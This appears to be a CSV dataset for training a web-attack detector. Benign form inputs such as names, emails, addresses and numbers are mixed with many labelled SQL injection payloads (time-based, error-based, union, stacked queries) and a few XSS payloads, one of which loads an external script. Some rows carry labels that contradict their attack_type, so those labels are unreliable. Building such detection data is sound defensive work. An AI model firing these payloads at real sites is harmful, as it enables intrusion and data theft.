Text,attack_type,Label,type
"1%'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",sqli,1,sql
butts@maxtienda.na,norm,0,normal
puy,norm,0,normal
17218977g,norm,0,normal
rocheman@sindns.er,norm,0,normal
05365,norm,0,normal
dennen_christlein@tantra-gay.sn,norm,0,normal
1%'))) and sleep(5) and ((('%'=',sqli,1,normal
"1)));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((7946=7946",sqli,1,sql
forn gndara,norm,0,normal
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('frpo' like 'frpo",sqli,1,sql
mir9136,norm,0,normal
1%')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',sqli,1,sql
"1') as yxdb where 4597=4597;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
5217,norm,0,normal
8761060371713838,norm,0,normal
"nudo josefa ramos de la orden 110,",norm,0,normal
1856004857366548,norm,0,normal
"1'+(select immd where 7499=7499 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
1%';select (case when (9490=6134) then 9490 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
9634788762109730,norm,0,normal
1') and 5999=5879,sqli,1,normal
"1""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
(7098=7098 and sleep(5)),sqli,1,normal
1'))) and 7533=7533 and ((('txex'='txex,sqli,1,normal
"1%'))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
10250,norm,0,normal
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
1681429677567137,norm,0,normal
urrupan moger,norm,0,normal
borobia,norm,0,normal
37169,norm,0,normal
pedroso,norm,0,normal
"-1663' or elt(1032=1032,3623) and 'yqaj' like 'yqaj",sqli,1,normal
86064216x,norm,0,normal
arribada,norm,0,normal
firon@magentalgtb.gi,norm,0,normal
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""sdvu"" like ""sdvu",sqli,1,sql
7738690201675696,norm,0,normal
frades,norm,0,normal
42301351g,norm,0,normal
argujillo,norm,0,normal
03440,norm,0,normal
"c/ montereria, 146 4d",norm,0,normal
caryn,norm,0,normal
"1""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1 where 1576=1576;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
teverga,norm,0,normal
"1%"")));select case when 4176=6138 then 1 else null end--",sqli,1,sql
"1 and 8407=(select count(*) from generate_series(1,5000000))",sqli,1,sql
e11c5nt6o,norm,0,normal
0452635229820629,norm,0,normal
"1') where 8163=8163;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1)) as zdbj where 2300=2300 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
19244,norm,0,normal
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe",sqli,1,sql
fabrelle,norm,0,normal
"1'))) or elt(6272=6272,sleep(5)) and ((('ayjb' like 'ayjb",sqli,1,normal
wanda,norm,0,normal
8285,norm,0,normal
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'toxr' like 'toxr,sqli,1,sql
"1%' union all select null,null,null,null,null,null--",sqli,1,sql
"-4669"" or 8571=8571--",sqli,1,sql
"-1<div onmouseover=""document.cookie=true;"">",xss,2,sql
rothamel,norm,0,normal
miller_fiore9@olvidalo.sy,norm,0,normal
"1' where 5004=5004 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- jpqa",sqli,1,sql
"1'||(select 'zqdn' where 6194=6194 union all select null,null,null,null--",sqli,1,sql
"-1510'))) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",sqli,1,sql
"oluges, les",norm,0,normal
1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,sqli,1,sql
"1%"";select (case when (3539=8768) then 3539 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"calle pea 49, 9?b",norm,0,normal
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",sqli,1,sql
-7707')) union all select 3172#,sqli,1,sql
9573180494481896,norm,0,normal
"1'+(select 'asmj' where 7808=7808 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",sqli,1,sql
9495157942989922,norm,0,normal
7463689061986370,norm,0,normal
er3t3e1,norm,0,normal
bunyola,norm,0,normal
"1"") where 1024=1024 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"-8118"") where 3561=3561 or (8459=8459)*4906--",sqli,1,sql
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""nrhz"" like ""nrhz",sqli,1,sql
2ra71o1,norm,0,normal
"1%"")) or sleep(5) and ((""%""=""",sqli,1,normal
96639593x,norm,0,normal
bailn lapetini,norm,0,normal
"1%""))) and elt(4249=4249,7259) and (((""%""=""",sqli,1,normal
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ican' like 'ican",sqli,1,sql
"calle duque de zaragoza s/n,",norm,0,normal
-6081 where 3681=3681 or 2603=3138--,sqli,1,sql
92742251h,norm,0,normal
narita@deportechino.an,norm,0,normal
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('lwlh'='lwlh",sqli,1,sql
conmover,norm,0,normal
"1%""));begin user_lock.sleep(5); end and ((""%""=""",sqli,1,sql
violas,norm,0,normal
97555694k,norm,0,normal
"de los cazadores, 196, 1-b",norm,0,normal
09195,norm,0,normal
descerrajada,norm,0,normal
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
damacia,norm,0,normal
m9gnificen5i5,norm,0,normal
mira boncompte,norm,0,normal
adrin,norm,0,normal
winston@chinavende.bi,norm,0,normal
1) where 4992=4992;select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",sqli,1,sql
4631,norm,0,normal
monzano3@chamilia.com.yu,norm,0,normal
34839,norm,0,normal
"1%"") or elt(5873=5873,sleep(5))#",sqli,1,normal
ajamil,norm,0,normal
"-3007) where 6648=6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",sqli,1,sql
"c/ zilbetiko monasterioaren, s/n,",norm,0,normal
"1)) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1"" rlike (select * from (select(sleep(5)))sgvo)",sqli,1,sql
28811,norm,0,normal
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'hzav'='hzav",sqli,1,normal
1')) and 3814=4272--,sqli,1,sql
1295,norm,0,normal
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
7993090576542905,norm,0,normal
-4157') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('rdhm'='rdhm,sqli,1,sql
milani4@beautifulbody.sh,norm,0,normal
kishida@fruteriacartaya.gm,norm,0,normal
-4308') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('jmot'='jmot,sqli,1,sql
hendry,norm,0,normal
23734,norm,0,normal
"1"" union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
tremewan,norm,0,normal
"1') as yhgk where 9246=9246 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
taravilla,norm,0,normal
1')));begin user_lock.sleep(5); end and ((('ycte'='ycte,sqli,1,sql
c/ maria zayas de sotomayor 18,norm,0,normal
sanou bellsol,norm,0,normal
ebert@lamola-hotel.rw,norm,0,normal
gretler-rinell@magadan.com.yu,norm,0,normal
foguear,norm,0,normal
danot sannicolas,norm,0,normal
"-6419 union all select 7008,7008,7008,7008,7008--",sqli,1,sql
bascuan sureda,norm,0,normal
"1') where 9516=9516;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
jument3,norm,0,normal
"1"")));begin dbms_lock.sleep(5); end--",sqli,1,sql
"-2006')) union all select 7852,7852,7852,7852,7852--",sqli,1,sql
1 where 7516=7516 union all select null#,sqli,1,sql
"1)) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"1%"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""%""=""",sqli,1,sql
-4882' order by 1#,sqli,1,normal
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('ulkq'='ulkq,sqli,1,sql
baggott@lamola-hotel.name,norm,0,normal
"-3179'+(select 'tzzz' where 3191=3191 union all select 3191,3191,3191,3191,3191#",sqli,1,sql
"1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""",sqli,1,normal
"-9031%"") order by 1--",sqli,1,sql
"-8966""))) or 1628=2712",sqli,1,normal
"1;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
12527,norm,0,normal
-5500') order by 1--,sqli,1,sql
nici,norm,0,normal
cercs,norm,0,normal
1')) as njop where 7001=7001;begin user_lock.sleep(5); end--,sqli,1,sql
paragon.calithness@callalelaboca.be,norm,0,normal
savitsky@tetdevelocidad.sj,norm,0,normal
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"1%' or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
naimi,norm,0,normal
"1');select count(*) from generate_series(1,5000000) and ('tnvm' like 'tnvm",sqli,1,sql
gregonio,norm,0,normal
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,sql
barrutia marsany,norm,0,normal
"1') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"<div style=""background-image: url(javascript:alert('crosssitescripting'))"">",xss,2,xss
"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",sqli,1,sql
42231079c,norm,0,normal
83178933p,norm,0,normal
mahl iglesia,norm,0,normal
"1) as ahfj where 4776=4776 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
41850,norm,0,normal
292,norm,0,normal
"1) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (3294=3294",sqli,1,sql
paulus,norm,0,normal
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxhn' like 'zxhn",sqli,1,sql
m43a3u6,norm,0,normal
"1"" where 7249=7249 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1%' and make_set(8403=8403,8899) and '%'='",sqli,1,normal
boothroy,norm,0,normal
13504152r,norm,0,normal
"1')) and make_set(1002=3556,3556) and (('mfao'='mfao",sqli,1,normal
lucas fiallega,norm,0,normal
rivaherr,norm,0,normal
"-4044%"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",sqli,1,sql
95937804c,norm,0,normal
"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",sqli,1,normal
retos9a1o,norm,0,normal
marven,norm,0,normal
swedlow@ubikuo.ga,norm,0,normal
"1') as akvn where 8669=8669;select * from generate_series(3990,3990,case when (3990=9597) then 1 else 0 end) limit 1--",sqli,1,sql
?c63ill1,norm,0,normal
"1 where 8333=8333 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
64446970g,norm,0,normal
"-1235"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""ahhz"" like ""ahhz",sqli,1,sql
agenor,norm,0,normal
1)) as wwkw where 7289=7289 and 7533=7533--,sqli,1,sql
san miguel del pino,norm,0,normal
e1pirativo,norm,0,normal
d8jami81t9,norm,0,normal
"c/ afluente, 82",norm,0,normal
bscones de ojeda,norm,0,normal
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('jxqf' like 'jxqf",sqli,1,sql
ozerea malibrn,norm,0,normal
1';select (case when (3681=5989) then 3681 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
viver,norm,0,normal
merindad de ro ubierna,norm,0,normal
c/ paralela al c/jon quebradizo 36,norm,0,normal
no,norm,0,normal
"1)) as vzgo where 6281=6281 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"-5891) where 5792=5792 union all select 5792,5792,5792,5792,5792#",sqli,1,sql
"1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo",sqli,1,sql
-8878' in boolean mode) union all select 7785#,sqli,1,sql
arguette@tuslimites.tc,norm,0,normal
capaz9,norm,0,normal
brookes,norm,0,normal
"1%'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
alexande,norm,0,normal
vila,norm,0,normal
50490,norm,0,normal
yaser,norm,0,normal
"-6478"")) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",sqli,1,sql
bonagura.orimoto@portaldesign.ht,norm,0,normal
"1,(case when 5514=9602 then 1 else null end)",sqli,1,normal
carr3e0,norm,0,normal
1'+(select 'xqjx' where 7048=7048 and 9198=9198--,sqli,1,sql
"-6496""))) or 1471=5278 and (((""zkoj""=""zkoj",sqli,1,normal
moretti alegre,norm,0,normal
"1') as rvli where 4427=4427;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
cantaracillo,norm,0,normal
"1%""))) order by 1--",sqli,1,sql
romangordo,norm,0,normal
amaro,norm,0,normal
2829,norm,0,normal
05659,norm,0,normal
"1%"")));begin user_lock.sleep(5); end and (((""%""=""",sqli,1,sql
"1"") where 8878=8878 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
"1"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
teodora,norm,0,normal
"1' and elt(9371=8882,8882) and 'vurh'='vurh",sqli,1,normal
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ""%""=""",sqli,1,sql
calle nieto 41,norm,0,normal
76rmi69so,norm,0,normal
borox,norm,0,normal
"1'||(select 'xpjg' where 3036=3036 and elt(1832=6644,6644))||'",sqli,1,sql
"1'||(select 'eils' where 8308=8308 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,sql
travesia franco 160,norm,0,normal
2686315485657344,norm,0,normal
"1') where 6634=6634 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
chinarro,norm,0,normal
sarris/sartze,norm,0,normal
betancur,norm,0,normal
0g83ma7ora,norm,0,normal
"1) as skby where 4269=4269 or elt(6272=6272,sleep(5))--",sqli,1,sql
"1' union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
urbon,norm,0,normal
"1)) as epfz where 5471=5471;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"1) where 7159=7159;select count(*) from generate_series(1,5000000)--",sqli,1,sql
lei-see,norm,0,normal
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('ufbr'='ufbr",sqli,1,sql
"-1917"") or 8571=8571--",sqli,1,sql
p21urit56,norm,0,normal
isel,norm,0,normal
1025489401142113,norm,0,normal
"calle gola de perellonet, 196,",norm,0,normal
allis,norm,0,normal
"-5425 where 5933=5933 union all select 5933,5933,5933--",sqli,1,sql
cus motj,norm,0,normal
misio+nal,norm,0,normal
decuplar,norm,0,normal
1)));begin user_lock.sleep(5); end--,sqli,1,sql
"1"" or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
55z8do,norm,0,normal
ost91ma,norm,0,normal
veronese vitte,norm,0,normal
morales de toro,norm,0,normal
olivio,norm,0,normal
ergasto,norm,0,normal
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""gimc"" like ""gimc",sqli,1,sql
gift@distritoeste.no,norm,0,normal
"-6108') union all select 2519,2519,2519,2519--",sqli,1,sql
falset,norm,0,normal
esio,norm,0,normal
"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
karyn,norm,0,normal
46643257q,norm,0,normal
24604865v,norm,0,normal
beln,norm,0,normal
"-5313') union all select 7187,7187,7187#",sqli,1,sql
c/ saturn s/n 4?h,norm,0,normal
43440,norm,0,normal
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""kssm""=""kssm",sqli,1,sql
54tra03u38706,norm,0,normal
"1%""))) waitfor delay '0:0:5' and (((""%""=""",sqli,1,normal
5796163870417935,norm,0,normal
unwin@hacia.gr,norm,0,normal
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cxor'='cxor",sqli,1,sql
muga sirera,norm,0,normal
ftpsites,norm,0,normal
65456048a,norm,0,normal
1' where 9216=9216;select sleep(5)--,sqli,1,sql
3466907709237907,norm,0,normal
terry@mtos.ar,norm,0,normal
menelao,norm,0,normal
arrechea bellveh,norm,0,normal
lovas@djbroadcast.bn,norm,0,normal
"1%') union all select null,null,null,null,null,null--",sqli,1,sql
canella,norm,0,normal
"-9379) or make_set(9354=9354,7185) and (9212=9212",sqli,1,normal
"1')) as eleh where 1347=1347 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
mamp8s30r2a,norm,0,normal
cenicientos,norm,0,normal
"1"") and 4760=2922",sqli,1,normal
19243,norm,0,normal
-9087 or 3038=3038,sqli,1,normal
lido,norm,0,normal
"-8698"" where 1990=1990 or (8459=8459)*4906--",sqli,1,sql
8424,norm,0,normal
nicolalde llovet,norm,0,normal
plza. taboada chivite 32 5?b,norm,0,normal
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('ckfn' like 'ckfn",sqli,1,normal
65904927z,norm,0,normal
"-7324) or make_set(8486=6544,6544)",sqli,1,normal
castelln,norm,0,normal
ryan,norm,0,normal
9os897,norm,0,normal
0106099240126772,norm,0,normal
"-8472') where 3340=3340 or make_set(1752=9905,9905)--",sqli,1,sql
1')) as hqhs where 5383=5383;select (case when (8978=1426) then 1 else 8978*(select 8978 from master..sysdatabases) end)--,sqli,1,sql
chuvalo@ppmanzanares.nc,norm,0,normal
25480,norm,0,normal
"-9032)) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",sqli,1,sql
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""qwdi""=""qwdi",sqli,1,sql
gorin.mccracken@evelin.am,norm,0,normal
"carrer francoli. 195, 8?h",norm,0,normal
j804n86o,norm,0,normal
"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""bqfj"" like ""bqfj",sqli,1,sql
sosao,norm,0,normal
0505974990919902,norm,0,normal
"calle robregordo, 171 10-c",norm,0,normal
54508517n,norm,0,normal
7647479172246248,norm,0,normal
vil francino,norm,0,normal
"1%') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('%'='",sqli,1,sql
1) where 8094=8094;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
1) where 3565=3565 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
winfield,norm,0,normal
coniecha,norm,0,normal
121,norm,0,normal
46183,norm,0,normal
sira,norm,0,normal
pacfica,norm,0,normal
-3966') or 7338=8657,sqli,1,normal
1')) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
matacandelas,norm,0,normal
6832377240698401,norm,0,normal
kristl@voragolive.vn,norm,0,normal
"1""))) rlike (select (case when (6915=4531) then 1 else 0x28 end)) and (((""jzzu""=""jzzu",sqli,1,sql
"1'||(select 'uvbb' where 7795=7795 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
1i515s7d7d,norm,0,normal
7869918811946914,norm,0,normal
delfa,norm,0,normal
elder@parcalia.hn,norm,0,normal
"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>",xss,2,xss
6rce8o,norm,0,normal
mcduffie,norm,0,normal
17485,norm,0,normal
"c/ pontevedra 25, 6a",norm,0,normal
damas severiche,norm,0,normal
37171,norm,0,normal
"1%')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('%'='",sqli,1,sql
"1""))) and elt(1210=1210,sleep(5)) and (((""felm""=""felm",sqli,1,normal
"1)) as tbiq where 7159=7159 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
lewwis.mall@epbx.pg,norm,0,normal
humfrey,norm,0,normal
"-7482%"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",sqli,1,sql
1010,norm,0,normal
riudavet,norm,0,normal
"-4764"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""dfvz"" like ""dfvz",sqli,1,sql
<!-- -- --><script>document.cookie=true;</script><!-- -- -->,xss,2,xss
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
jeria cifr,norm,0,normal
1') and sleep(5) and ('xecl' like 'xecl,sqli,1,normal
"-1366' or make_set(9354=9354,7185) and 'abre'='abre",sqli,1,normal
"1) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",sqli,1,normal
1 and 9412=6877#,sqli,1,normal
09767374x,norm,0,normal
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",xss,2,sql
"1%"")) and 8316=6410#",sqli,1,normal
"seca, la",norm,0,normal
sanidad,norm,0,normal
girish,norm,0,normal
vicari joan catany 123 1?c,norm,0,normal
c7lifa01,norm,0,normal
"1"")) as khqq where 3637=3637 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
g53on3a9u56,norm,0,normal
guipzcoa,norm,0,normal
"-5169"")) union all select 6198,6198,6198,6198--",sqli,1,sql
"1%"" rlike sleep(5)#",sqli,1,normal
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ayqn' like 'ayqn",sqli,1,sql
r92e1*56e,norm,0,normal
1%')));(select * from (select(sleep(5)))acdk)#,sqli,1,sql
scanlon@theroxyblue.ng,norm,0,normal
salgueiro 188,norm,0,normal
4075,norm,0,normal
50420,norm,0,normal
"fray bernardino de sahagun, 116 9c",norm,0,normal
8095702483441031,norm,0,normal
"1)) as oqfr where 6426=6426 and make_set(8403=8403,8899)--",sqli,1,sql
mandruso,norm,0,normal
desailly_bosworth@coworkers.gov,norm,0,normal
tse,norm,0,normal
73t4h5mbre4,norm,0,normal
khariton,norm,0,normal
"1) and make_set(8403=8403,8899) and (9761=9761",sqli,1,normal
368,norm,0,normal
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
eficiente,norm,0,normal
victor juan,norm,0,normal
-6190'))) union all select 9413--,sqli,1,sql
chichicaste,norm,0,normal
pierre-y,norm,0,normal
stiefel8@spainbareback.eu,norm,0,normal
-5113'))) or 7200=3094--,sqli,1,sql
ann-margaret@indorec.pro,norm,0,normal
graciot ballv,norm,0,normal
johsin,norm,0,normal
ramani,norm,0,normal
c2645ido,norm,0,normal
"1%"")) and make_set(8403=8403,8899) and ((""%""=""",sqli,1,normal
"1';select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
rev8nir,norm,0,normal
exactor,norm,0,normal
"1"" and make_set(8262=3471,3471) and ""wayp""=""wayp",sqli,1,normal
4091009305974951,norm,0,normal
cerd,norm,0,normal
